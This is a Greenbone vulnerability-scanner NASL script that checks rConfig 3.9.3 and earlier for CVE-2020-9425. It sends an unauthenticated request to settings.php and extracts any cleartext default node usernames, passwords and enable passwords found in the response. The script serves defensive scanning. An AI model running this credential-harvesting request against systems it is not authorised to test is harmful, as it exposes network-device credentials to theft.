# Copyright (C) 2020 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:rconfig:rconfig";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143625");
  script_version("2020-03-23T06:55:53+0000");
  script_tag(name:"last_modification", value:"2020-03-23 09:09:57 +0000 (Mon, 23 Mar 2020)");
  script_tag(name:"creation_date", value:"2020-03-23 05:35:56 +0000 (Mon, 23 Mar 2020)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2020-9425");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("rConfig < 3.9.4 Information Disclosure Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_rconfig_detect.nasl");
  script_mandatory_keys("rconfig/detected");

  script_tag(name:"summary", value:"rConfig is prone to an unauthenticated information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends an HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"An issue was discovered in includes/head.inc.php in rConfig. An unauthenticated
  attacker can retrieve saved cleartext credentials via a GET request to settings.php. Because the application was
  not exiting after a redirect is applied, the rest of the page still executed, resulting in the disclosure of
  cleartext credentials in the response.");

  script_tag(name:"affected", value:"rConfig version 3.9.3 and prior.");

  script_tag(name:"solution", value:"Update to version 3.9.4 or later.");

  script_xref(name:"URL", value:"https://blog.hivint.com/rconfig-3-9-3-unauthenticated-sensitive-information-disclosure-ead4ed88f153?gi=1459756b1ca8");
  script_xref(name:"URL", value:"https://github.com/rconfig/rconfig/commit/20f4e3d87e84663d922b937842fddd9af1b68dd9");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/settings.php";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if ("defaultNodeUsername" >< res && "defaultNodePassword" >< res) {
  user = eregmatch(pattern: 'value="([^"]+)" id="defaultNodeUsername"', string: res);
  nodepw = eregmatch(pattern: 'value="([^"]+)" id="defaultNodePassword"', string: res);
  enblpw = eregmatch(pattern: 'value="([^"]+)" id="defaultNodeEnable"', string: res);

  if (!isnull(user[1]) || !isnull(nodepw[1]) || !isnull(enblpw[1])) {
    report = 'It was possible to obtain the following credentials:\n\n';

    if (!isnull(user[1]))
      report += 'Default Node Username:   ' + user[1] + '\n';
    if (!isnull(nodepw[1]))
      report += 'Default Node Password:   ' + nodepw[1] + '\n';
    if (!isnull(enblpw[1]))
      report += 'Default Enable Password: ' + enblpw[1] + '\n';

    security_message(port: port, data: report);

    exit(0);
  }
}

exit(99);
